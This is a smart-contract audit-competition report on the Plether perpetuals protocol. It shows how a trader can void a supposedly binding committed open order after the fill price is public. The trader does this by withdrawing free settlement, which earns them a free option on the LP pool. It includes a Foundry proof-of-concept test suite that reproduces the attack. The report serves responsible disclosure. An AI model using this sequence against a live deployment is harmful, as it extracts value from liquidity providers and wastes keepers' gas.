# \#99483 [SC-Low] A committed open is cancellable by its owner after the fill price is public, breaking binding-intent and handing the trader a free option on the pool

**Submitted on Nov 13th 2026 at 20:58:08 UTC by @satyaorz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99483
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
Plether deliberately ships **no order-cancellation entrypoint** — `SECURITY.md` states it as a security property twice, specifically to stop traders "turning queued intents into free options." A skew-reducing open breaks that property: its mandatory negative-VPI reserve is funded **from the account's free settlement first**, and commit-time admission approves the order against the account's *current* free settlement — cash the trader can withdraw one block later. The trader therefore commits a "binding" order, waits for the fill price to become public, and either lets it fill or withdraws the backing cash to force a terminal rejection. On mainnet this hands every skew-reducing opener a free, one-sided option the LP pool writes but is never paid for, and lets committed orders be discarded for the forfeited opening bounty (~$0.20 on a $300,000 order), occupying FIFO slots and burning keeper gas.

## Vulnerability Details
The preconditions are ordinary and attacker-controllable: an open that reduces the current book skew (the normal, continuously-present state of any live perp market — and one the attacker can create directly, as the PoC does by opening the opposing side on a second account) earns a negative VPI, and the account carries withdrawable free settlement, which any trader who has deposited has.

For such a skew-reducing open the position accrues negative lifetime VPI that must be backed by a dedicated reserve, and that reserve is drawn **from free settlement first**, from the new pledge only for the remainder (`packages/perps/src/libraries/CfdEnginePlanLib.sol:561-575`):

```solidity
uint256 vpiReserveIncreaseAssets = delta.vpiRebateReserveAfterAssets > delta.vpiRebateReserveBeforeAssets
    ? delta.vpiRebateReserveAfterAssets - delta.vpiRebateReserveBeforeAssets : 0;
uint256 vpiReserveFromFreeAssets = vpiReserveIncreaseAssets < openCostPlan.resultingFreeSettlementAssets
    ? vpiReserveIncreaseAssets
    : openCostPlan.resultingFreeSettlementAssets;          // <-- free settlement consumed FIRST
delta.vpiRebateReserveFromPledgeAssets = vpiReserveIncreaseAssets - vpiReserveFromFreeAssets;
if (delta.vpiRebateReserveFromPledgeAssets > newPledgeAvailableAssets) {
    delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.VPI_REBATE_RESERVE_UNFUNDED; return;
}
newPledgeAvailableAssets -= delta.vpiRebateReserveFromPledgeAssets;
if (reserveIncreaseAssets > newPledgeAvailableAssets) {
    delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.LIQUIDATION_RESERVE_UNFUNDED; return;
}
```

`resultingFreeSettlementAssets` is the account's **pre-existing, withdrawable** free settlement plus this order's own rebate credit. Every other mandatory cost has the opposite priority: `planCarryLossConsumption` / `planOpenCostApplication` (`MarginClearinghouseAccountingLib.sol:95-107, 139-153`) spend the supplied `marginDelta` first and reach free settlement only for the excess. That asymmetry is the bug: commit-time admission (`OrderLiquidationBatchLogic.sol:432` calls `CfdEngineLens.previewOpenRevertCode` at `CfdEngineLens.sol:145`, whose `_previewOpen` (`:255`) plans against `_buildRawSnapshot` (`:711`) — the account's live buckets) approves an order whose mandatory reserve is backed by cash the owner can remove — and withdrawing free settlement while flat with a pending open is explicitly permitted (`CfdEngineSettlementSidecar.sol:255-271`).

Once the cash is gone the reserve lands on the pledge, displaces the liquidation reserve, and the planner rejects the open terminally (`PlannerRejected`) — not retryable, so it is gone.

The trader controls the timing on both sides: they choose when to commit and when to withdraw, and only withdraw when they want to cancel. The withdrawal is submitted once the first post-commit tick is visible and before the keeper's next execution of that order (on Arbitrum the trader can secure ordering via Timeboost). Losing that ordering is never adverse to the trader — it simply fills the order at a price they had already decided was acceptable — so the cancellation optionality carries no downside and requires no favorable assumption to be usable.

**No withdrawal guard catches it.** `validateWithdraw` (`CfdEngineSettlementSidecar.sol:255-306`) has a strong health guard only when the account **holds a position**; a trader opening a position is flat by definition, so they hit the flat-account branch, whose only protection is a settlement floor read straight off the trader's own order bounds (`minPostSettlementBalanceAssets`, `OrderSettlementFloorLib.sol:31-32`) and gated by `if (minimum != 0)`. The protocol accepts `minPostSettlementBalanceAssets = 0`, so the floor that would stop this is opt-in and the attacker opts out.

**This breaks a documented security property** (not a design limitation): `SECURITY.md:366` "Binding intents | Users cannot cancel queued orders once committed" and `SECURITY.md:658` "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options."


## Impact Details
A committed order that the protocol documents as non-cancellable (`SECURITY.md:366`, "Users cannot cancel queued orders once committed") can be discarded by its owner after the fill price is public, for the cost of the forfeited opening bounty (~0.20 USDG on a 300,000 USDG order). This directly defeats the property `SECURITY.md:658` states the design exists to uphold: that binding order semantics "prevent traders from turning queued intents into free options."

The impact is a free, one-sided option written by the LP pool and never paid for. Each element of that option is demonstrated directly by the PoC: the order is committed and binding (`test_H002b_Control_OpenExecutesWithoutWithdrawal`), the fill price is public before the owner decides (the withdrawal is submitted after the post-commit tick is available), and the order is voidable at will for ~0.20 USDG (`test_H002b_TraderCancelsBindingOpenAfterSeeingThePrice`). An instrument that can be entered or voided at no cost after its price is known is, by definition, a free option — no price-path assumption is required for the option to exist, only to price it. The trader sees the first post-commit execution price before deciding whether to let the order fill or cancel it, so they keep the fills that move in their favor and discard the rest for ~0.20 USDG. Across repeated orders this is systematic adverse selection against the pool, which is the counterparty to every trade: the pool is left holding the trades that go against it while being denied the premium it would require to write that optionality. Synthetix identified this exact economic failure for cancellable delayed orders and priced it with a mandatory commitment fee (SIP-2004); Plether charges no commitment fee, so binding-intent is the sole mitigation — and this defeats it. The attack is repeatable per order and per account across the global FIFO queue, and each cancelled order additionally occupies a FIFO slot and burns a keeper's execution gas for a terminal failure the keeper is not compensated for.

In-scope impact — Griefing: an unprivileged trader damages the protocol and its LPs by defeating the documented binding-intent guarantee (`SECURITY.md:366`/`:658`), forcing the LP pool to underwrite one-sided options it is never paid for, occupying a global FIFO slot for every cancelled order, and burning keeper execution gas for a terminal failure the keeper is not compensated for. It is available to any unprivileged account on the shipped configuration, the attacker risks nothing, and each cancellation costs only the ~0.20 USDG opening bounty.

**Recommendation:** make commit-time admission and execution agree on the reserve's funding source — either fund `vpiReserveIncreaseAssets` from the new pledge first (so `marginDelta` alone covers it), or floor the withdrawable balance at commit using the existing `OrderSettlementFloorLib` machinery (`test_H002b_ExistingSettlementFloorWouldPreventIt` shows any non-degenerate floor already defeats it). Also treat `minPostSettlementBalanceAssets == 0` on an order that depends on free settlement as a commit-time rejection rather than a silent opt-out.

## References

- `packages/perps/src/libraries/CfdEnginePlanLib.sol:561-575` (root cause — free-settlement-first VPI reserve funding)
- `packages/perps/src/libraries/MarginClearinghouseAccountingLib.sol:95-107, 139-153` (opposite funding priority of other costs)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:432`, `packages/perps/src/CfdEngineLens.sol:145` (`previewOpenRevertCode`) + `:711` (`_buildRawSnapshot`) (commit-time admission vs live buckets)
- `packages/perps/src/CfdEngineSettlementSidecar.sol:255-306` (flat-account withdraw has no health guard), `libraries/OrderSettlementFloorLib.sol:31-32` (trader-set floor)
- `packages/perps/src/SECURITY.md:366`, `:658` (binding-intent / free-option property this breaks)
- PoC: `packages/perps/test/hunt/H002b_VpiReserveBindingOpenCancel.t.sol`
- Prior art (supporting, not duplicating): Synthetix SIP-2004 (cancellable delayed orders are a free option, priced with a commitment fee)


## Proof of Concept

**Proof of concept**

Environment: the project's own Foundry suite at commit `a82d4fef`. No `packages/perps/src` contract is modified and no storage is written artificially. The **attack path** runs entirely through public entrypoints — `OrderRouter.commitOrder` (trader), `MarginClearinghouse.withdraw` (trader), `OrderRouter.executeOrder` (keeper, exactly as on mainnet). The benign precondition it relies on — a counterparty LONG that makes ALICE's SHORT skew-reducing, plus the initial mark — is a normal, reachable state established with the project's standard test fixture (`_open` / `updateMarkPrice`); any trader can create that skew through the public flow, as noted in Vulnerability Details.

Reproduce: save the file below as `packages/perps/test/hunt/H002b_VpiReserveBindingOpenCancel.t.sol`, then run:

```
cd packages/perps
ulimit -v 24000000
forge test --match-path 'test/hunt/H002b*' --threads 1 -vv
```

Result — 8 tests, all pass. What each proves:

- `test_H002b_TraderCancelsBindingOpenAfterSeeingThePrice` — the core result: the trader commits an open (commit-time admission returns OK), then withdraws free settlement; the keeper's execution of the committed "binding" order returns `Failed / PlannerRejected` and `positions(ALICE).size == 0`. The committed order is cancelled; the trader's cost is the forfeited opening bounty, `cost of cancelling a binding order: 200000` (0.20 USDG on a 300,000 USDG order).
- `test_H002b_Control_OpenExecutesWithoutWithdrawal` — baseline: the identical commit, with nothing withdrawn, `Executed`. The order is genuinely binding; the cancellation is caused solely by the free-settlement withdrawal.
- `test_H002b_ProductionParams_CancelWindowExists` — at the documented deployment risk parameters the cancellable margin window is 910→1030 USDG, i.e. 13% of order margin and starting at the *minimum admissible margin*, so the default thin-margin skew-reducing open is cancellable with no special sizing.
- `test_H002b_NoVpi_NoCancelWindow` (`vpiFactor = 0`) — differential control: with VPI disabled there is no negative-VPI reserve and no cancellable margin anywhere in the sweep, isolating the reserve-funding path as the cause.
- `test_H002b_ExistingSettlementFloorWouldPreventIt` — the fix is already in the codebase and simply not applied: with a non-zero `minPostSettlementBalanceAssets` the identical withdrawal is refused and the open executes.

Full PoC — save as `test/hunt/H002b_VpiReserveBindingOpenCancel.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

/// H-002b: a skew-reducing open's negative-VPI reserve is funded from free settlement FIRST
/// (CfdEnginePlanLib.sol:561-575). Commit-time admission previews against the account's CURRENT free settlement, so
/// it approves on the strength of cash the trader can withdraw one block later; once withdrawn the reserve lands on
/// the pledge, displaces the liquidation reserve, and the "binding" open fails terminally (PlannerRejected).
/// This defeats SECURITY.md:366/:658 (users cannot cancel committed orders / no free options).
/// vpiFactor is 0.01e18 in the documented deployment (DEPLOYMENT.md:131); H002b_Control_NoVpi runs vpiFactor=0 and
/// finds no window, isolating the negative-VPI reserve as the cause.
abstract contract H002bBase is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant BOB = address(0xB0B);
    address internal constant KEEPER = address(0xE0EC);

    uint256 internal constant SIZE = 300_000e18;      // 3_000 lots = 300_000 USDG notional at a 1.00 basket
    uint256 internal constant SKEW_SIZE = 380_000e18; // BOB's LONG makes ALICE's SHORT skew-reducing (earns rebate)

    function _vpiFactor() internal pure virtual returns (uint256);
    function _maintBps() internal pure virtual returns (uint256) { return 100; }
    function _initBps() internal pure virtual returns (uint256) { return 150; }
    function _sweepLow() internal pure virtual returns (uint256) { return 4_700e6; }
    function _sweepHigh() internal pure virtual returns (uint256) { return 5_100e6; }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: _vpiFactor(),
            maxSkewRatio: 0.4e18,
            maintMarginBps: _maintBps(),
            initMarginBps: _initBps(),
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(block.timestamp));
        _fundTrader(BOB, 100_000e6);
        _open(BOB, CfdTypes.Side.LONG, SKEW_SIZE, 50_000e6, 1e8);
        _fundTrader(ALICE, 50_000e6);
    }

    function _shortOpenRequest(bytes32 clientId, uint256 margin)
        internal view returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = clientId;
        request.side = CfdTypes.Side.SHORT;
        request.sizeDelta = SIZE;
        request.marginDelta = margin;
        request.targetPrice = CAP_PRICE; // open SHORT: target is a maximum entry; CAP accepts any
        request.isClose = false;
        uint64 window = uint64(router.maxExecutionWindowSeconds());
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _preview(uint256 margin) internal view returns (ICfdEngineTypes.OpenPreview memory) {
        return engineLens.previewOpen(ALICE, CfdTypes.Side.SHORT, SIZE, margin, 1e8);
    }

    /// Returns how many margin values in the sweep let the trader cancel a committed open.
    function _sweepCancelWindow() internal returns (uint256 hits) {
        for (uint256 m = _sweepLow(); m <= _sweepHigh(); m += 10e6) {
            uint256 snap = vm.snapshotState();
            vm.warp(vm.getBlockTimestamp() + 1);

            OrderV3Types.OrderRequest memory req = _shortOpenRequest(keccak256(abi.encode("v", m)), m);
            vm.prank(ALICE);
            uint64 id;
            try router.commitOrder(req) returns (uint64 got) {
                id = got;
            } catch {
                emit log_named_uint("commit rejected; margin", m / 1e6);
                vm.revertToState(snap);
                continue;
            }

            // Control branch: leave the account untouched.
            uint256 branch = vm.snapshotState();
            bytes[] memory data = _mockPythUpdateData(1e8);
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory control = router.executeOrder(id, data);
            vm.revertToState(branch);

            // Attack branch: ALICE removes the free settlement the VPI reserve was approved against.
            uint256 free = _freeSettlementAssets(ALICE);
            vm.prank(ALICE);
            clearinghouse.withdraw(ALICE, free);
            data = _mockPythUpdateData(1e8);
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory attack = router.executeOrder(id, data);

            if (
                uint8(control.status) == uint8(OrderV3Types.LifecycleStatus.Executed)
                    && uint8(attack.status) == uint8(OrderV3Types.LifecycleStatus.Failed)
            ) {
                ++hits;
                emit log_named_uint("CANCEL-BY-WITHDRAW margin", m / 1e6);
            } else {
                emit log_named_uint("no flip; margin", m / 1e6);
            }
            vm.revertToState(snap);
        }
        emit log_named_uint("flip count", hits);
    }
}

contract H002b_VpiReserveBindingOpenCancel is H002bBase {

    function _vpiFactor() internal pure override returns (uint256) {
        return 0.01e18;
    }

    /// Diagnostic: the skew-reducing open earns a rebate (negative VPI) — the precondition for the path.
    function test_H002b_Diag_SkewReducingOpenEarnsRebate() public {
        ICfdEngineTypes.OpenPreview memory p = _preview(5_000e6);
        emit log_named_int("vpiAssets (negative = rebate)", p.vpiAssets);
        assertLt(p.vpiAssets, 0, "ALICE's SHORT must be skew-reducing (negative VPI) for this path");
    }

    /// The cancel is available across a band of prices ADVERSE to the committed SHORT (basket falling).
    function test_H002b_SweepAdversePriceBand() public {
        uint256 margin = 4_820e6; // bottom edge of the cancellable window at a 1.00 commit mark
        uint256 adverseHits;
        uint256[7] memory prices =
            [uint256(100_000_000), 99_500_000, 99_000_000, 98_500_000, 98_000_000, 97_500_000, 97_000_000];

        for (uint256 i; i < prices.length; ++i) {
            uint256 px = prices[i];
            uint256 snap = vm.snapshotState();
            vm.warp(vm.getBlockTimestamp() + 1);
            OrderV3Types.OrderRequest memory req = _shortOpenRequest(keccak256(abi.encode("band", px)), margin);
            vm.prank(ALICE);
            uint64 id = router.commitOrder(req);

            uint256 branch = vm.snapshotState();
            bytes[] memory data = _mockPythUpdateData(px);
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory control = router.executeOrder(id, data);
            vm.revertToState(branch);

            uint256 free = _freeSettlementAssets(ALICE);
            vm.prank(ALICE);
            clearinghouse.withdraw(ALICE, free);
            data = _mockPythUpdateData(px);
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory attack = router.executeOrder(id, data);

            bool cancelled = uint8(control.status) == uint8(OrderV3Types.LifecycleStatus.Executed)
                && uint8(attack.status) == uint8(OrderV3Types.LifecycleStatus.Failed);
            if (cancelled && px < 1e8) {
                ++adverseHits;
            }
            vm.revertToState(snap);
        }
        emit log_named_uint("adverse-price cancels", adverseHits);
        assertGt(adverseHits, 0, "the cancel must be available at prices adverse to the committed SHORT");
    }

    /// The headline PoC: one binding open, cancelled unilaterally after commit, with an adverse post-commit tick.
    function test_H002b_TraderCancelsBindingOpenAfterSeeingThePrice() public {
        uint256 margin = 4_820e6; // bottom edge of the window, so the cancel survives an adverse tick
        uint256 startBalance = clearinghouse.balanceAssets(ALICE);

        vm.warp(vm.getBlockTimestamp() + 1);
        OrderV3Types.OrderRequest memory req = _shortOpenRequest(keccak256("v-cancel"), margin);
        vm.prank(ALICE);
        uint64 id = router.commitOrder(req);

        // Commit-time admission approved the plan while the free settlement was still there.
        assertEq(uint8(_preview(margin).invalidReason), uint8(0), "commit-time plan is valid (OK)");

        // The first post-commit tick is public. The basket is falling: a SHORT entry is the wrong side of it.
        uint256 free = _freeSettlementAssets(ALICE);
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, free);

        bytes[] memory data = _mockPythUpdateData(99_000_000);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "binding open died");
        assertEq(
            uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.PlannerRejected), "terminal, not retryable"
        );

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "no position was opened");

        uint256 recovered = clearinghouse.balanceAssets(ALICE) + free;
        emit log_named_uint("cost of cancelling a binding order", startBalance - recovered);
    }

    /// Control: identical commit, nothing withdrawn, same adverse tick -- the open is genuinely binding.
    function test_H002b_Control_OpenExecutesWithoutWithdrawal() public {
        vm.warp(vm.getBlockTimestamp() + 1);
        OrderV3Types.OrderRequest memory req = _shortOpenRequest(keccak256("v-ctrl"), 4_900e6);
        vm.prank(ALICE);
        uint64 id = router.commitOrder(req);
        bytes[] memory data = _mockPythUpdateData(99_000_000);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "control executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, SIZE, "control opens the position");
    }

    function test_H002b_SweepCancelWindow() public {
        assertGt(_sweepCancelWindow(), 0, "a margin window must exist where the trader cancels a binding open");
    }

    /// The guard that would have stopped this already exists, and it is the trader's to disable:
    /// validateWithdraw's FLAT-account branch (CfdEngineSettlementSidecar.sol:260-273) enforces a settlement floor
    /// read off the order's own bounds (OrderSettlementFloorLib.sol:31-32), gated by `if (minimum != 0)`. Submitting
    /// minPostSettlementBalanceAssets = 0 turns it off. Set it non-zero and the identical withdrawal is refused.
    function test_H002b_ExistingSettlementFloorWouldPreventIt() public {
        vm.warp(vm.getBlockTimestamp() + 1);
        OrderV3Types.OrderRequest memory req = _shortOpenRequest(keccak256("v-floor"), 4_820e6);
        req.bounds.minPostSettlementBalanceAssets = 1e6; // any nonzero floor arms the check
        req.bounds.maxGrossAccountDebitAssets = 5_000e6; // a finite, realistic debit allowance
        vm.prank(ALICE);
        uint64 id = router.commitOrder(req);

        uint256 free = _freeSettlementAssets(ALICE);
        vm.prank(ALICE);
        vm.expectRevert(); // OrderRouter__SettlementFloorWithdrawal(orderId, balance, minimum, maxDebit)
        clearinghouse.withdraw(ALICE, free);

        // The cash stayed, so the order is still fully funded and fills.
        assertEq(_freeSettlementAssets(ALICE), free, "withdrawal refused, free settlement intact");
        bytes[] memory data = _mockPythUpdateData(99_000_000);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(
            uint8(result.status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "with the floor armed the committed open is genuinely binding"
        );
    }
}

/// The same attack at the documented deployment risk parameters (DEPLOYMENT.md: maint 0.1%, init 0.2%).
contract H002b_ProductionParams is H002bBase {
    function _vpiFactor() internal pure override returns (uint256) { return 0.01e18; }
    function _maintBps() internal pure override returns (uint256) { return 10; }
    function _initBps() internal pure override returns (uint256) { return 20; }
    function _sweepLow() internal pure override returns (uint256) { return 850e6; }
    function _sweepHigh() internal pure override returns (uint256) { return 1_150e6; }

    function test_H002b_ProductionParams_CancelWindowExists() public {
        assertGt(_sweepCancelWindow(), 0, "the window exists at deployment risk parameters");
    }
}

/// Differential control: the identical scenario with VPI disabled. No negative-VPI reserve, no window.
contract H002b_Control_NoVpi is H002bBase {
    function _vpiFactor() internal pure override returns (uint256) { return 0; }

    function test_H002b_NoVpi_NoCancelWindow() public {
        assertEq(_sweepCancelWindow(), 0, "without the negative-VPI reserve, a committed open cannot be cancelled");
    }
}
```

`vpiFactor = 0.01e18` in the shipped deployment (`DEPLOYMENT.md:131`), so the path is live.

